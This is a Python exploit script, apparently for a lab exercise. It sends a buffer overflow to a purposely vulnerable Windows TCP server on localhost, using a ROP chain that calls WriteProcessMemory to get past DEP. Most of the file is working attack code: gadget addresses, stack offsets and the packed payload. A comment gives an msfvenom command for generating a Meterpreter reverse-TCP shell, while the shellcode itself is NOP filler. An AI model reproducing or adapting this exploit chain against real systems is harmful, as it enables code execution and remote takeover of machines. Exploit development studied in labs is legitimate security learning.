"""
Exploit Script for Vulnerable TCP Server

This script demonstrates a buffer overflow attack against a specifically crafted vulnerable TCP server application.
The server contains a buffer overflow vulnerability in its handling of incoming data. This vulnerability is
exploited using a Return-Oriented Programming (ROP) chain to bypass modern security mechanisms like DEP (Data
Execution Prevention).

The exploit uses the Windows API function WriteProcessMemory to manipulate memory within the server process.
Key components of the exploit include:
- Crafting ROP gadgets that adjust the stack and manipulate registers to control the flow of execution.
- Overwriting specific memory addresses to redirect the server's execution to malicious payload (shellcode).
- Disabling ASLR (Address Space Layout Randomization) and stack cookies, while keeping DEP enabled, requiring precise ROP chain construction.

The script constructs a payload that:
1. Sets up the memory write via WriteProcessMemory.
2. Adjusts the stack pointer to the payload.
3. Executes shellcode to take control over the process.

The exploit is sent over a network connection to the target server running on localhost at a predefined port.

WARNING: This script is for educational and testing purposes only. Running this script against non-consenting servers is illegal and unethical.

Social Media Links:
- Twitter: https://twitter.com/7etsuo
- GitHub: https://github.com/7etsuo
- YouTube: https://www.youtube.com/@snowcrash

Author: 7etsuo, 2024
"""

import socket
import struct

# BOOL WriteProcessMemory (
#    HANDLE  hProcess,
#    LPVOID  lpBaseAddress,
#    LPCVOID lpBuffer,
#    SIZE_T  nSize,
#    SIZE_T  *lpNumberOfBytesWritten
# );

skeleton =  struct.pack("<L", 0x41414141) # WriteProcessMemory address
skeleton += struct.pack("<L", 0x00410c00) # shellcode return address to return to after WPM is called (Code Cave Address)
skeleton += struct.pack("<L", 0xffffffff) # hProcess (pseduo process handle)
skeleton += struct.pack("<L", 0x00410c00) # lpBaseAddress (Code cave Address)
skeleton += struct.pack("<L", 0x44444444) # lpBuffer (stack address of shellcode)
skeleton += struct.pack("<L", 0x45454545) # nSize (size of shellcode)
skeleton += struct.pack("<L", 0x0041861c) # lpNumberOfBytesWritten (writable memory address, i.e. !dh -a Module) 

gadgets = {
    
    # rop gadgets

    "push esp ; pop esi ; ret" : struct.pack("<L", 0x411849),
    "push eax ; pop esi ; ret" : struct.pack("<L", 0x411829),
    "mov [eax], ecx ; ret" : struct.pack("<L", 0x411729),
    "mov eax, [eax] ; ret" : struct.pack("<L", 0x411999),
    "mov eax, esi ; pop esi ; ret" : struct.pack("<L", 0x4117a9),
    "add eax, ecx ; ret" : struct.pack("<L", 0x411749),
    "pop ecx ; ret" : struct.pack("<L", 0x411809),
    "pop eax ; ret" : struct.pack("<L", 0x4117e9),
    "inc eax ; ret" : struct.pack("<L", 0x411789),
    "neg eax ; ret" : struct.pack("<L", 0x411769),
    "mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010" : struct.pack("<L", 0x4117c9),
    "xchg eax, esp ; ret": struct.pack("<L", 0x411869),

    # offsets 

    "WriteProcessMemory IAT" : struct.pack("<L", 0x00419000),
    "offset to skeleton WPM address -36" : struct.pack("<L", (0xffffffdc)),
    "offset to skeleton lpBuffer 16" : struct.pack("<L", (16)),
    "offset to shellcode from lpBuffer" : struct.pack("<L", (416)),
    "relative lpBuffer offset from shellcode" : struct.pack("<L", (0xfffffe60)),
    "-sizeof(shellcode) = -524" : struct.pack("<L", 0xfffffdf4),
    "offset to rop skeleton -0x14" : struct.pack("<L", 0xffffffec),
    "junk" : struct.pack("<L", 0x41414141),
}

ebp = b'B'*4
rop = b""

# WriteProcessMemory IAT 

rop += gadgets["push esp ; pop esi ; ret"]
rop += gadgets["pop ecx ; ret"]
rop += gadgets["offset to skeleton WPM address -36"]
rop += gadgets["mov eax, esi ; pop esi ; ret"]
rop += gadgets["junk"]
rop += gadgets["add eax, ecx ; ret"]
rop += gadgets["push eax ; pop esi ; ret"]
rop += gadgets["pop eax ; ret"]
rop += gadgets["WriteProcessMemory IAT"]
rop += gadgets["mov eax, [eax] ; ret"]
rop += gadgets["mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010"]
rop += gadgets["junk"] # pop esi
rop += gadgets["mov [eax], ecx ; ret"]
rop += gadgets["junk"] * 4

# offset to lpBuffer

rop += gadgets["pop ecx ; ret"]
rop += gadgets["offset to skeleton lpBuffer 16"]
rop += gadgets["add eax, ecx ; ret"] # EAX = lpBuffer
rop += gadgets["push eax ; pop esi ; ret"]

# add offset to shellcode on stack for skeleton lpBuffer

rop += gadgets["pop ecx ; ret"] # ECX = first skeleton offset
rop += gadgets["offset to shellcode from lpBuffer"]
rop += gadgets["add eax, ecx ; ret"] # EAX = &shellcode

# set *(skeleton + lpBuffer) = shellcode

rop += gadgets["mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010"] # ECX = shellcode
rop += gadgets["junk"] # for pop esi
rop += gadgets["pop eax ; ret"] #  EAX = offset for lpBuffer
rop += gadgets["junk"] * 4
rop += gadgets["relative lpBuffer offset from shellcode"]
rop += gadgets["add eax, ecx ; ret"] # EAX = lpBuffer = (shellcode - offsetToLpBuffer)
rop += gadgets["mov [eax], ecx ; ret"] # *EAX = *lpBuffer = &shellcode

# offset to nSize

rop += gadgets["inc eax ; ret"] * 4

# nSize = sizeof(shellcode)

rop += gadgets["push eax ; pop esi ; ret"]
rop += gadgets["pop eax ; ret"]
rop += gadgets["-sizeof(shellcode) = -524"]
rop += gadgets["neg eax ; ret"]
rop += gadgets["mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010"] 
rop += gadgets["junk"]
rop += gadgets["mov [eax], ecx ; ret"]
rop += gadgets["junk"] * 4

# Align ESP to ROP Skeleton

rop += gadgets["pop ecx ; ret"]
rop += gadgets["offset to rop skeleton -0x14"]
rop += gadgets["add eax, ecx ; ret"]
rop += gadgets["xchg eax, esp ; ret"]

# shellcode

rop_padding = b'\x90' * (400 - len(rop))
shellcode_padding = b'\x90' * (16 + (len(rop_padding) & 7)) # even address for shellcode

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=8080 -v shellcode -f python
# Payload size: 354 bytes

shellcode =  b"\x90"*354

buf = skeleton + ebp + rop + rop_padding + shellcode_padding + shellcode + b'\x90' * 16

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 12345))
s.sendall(buf)
s.close()
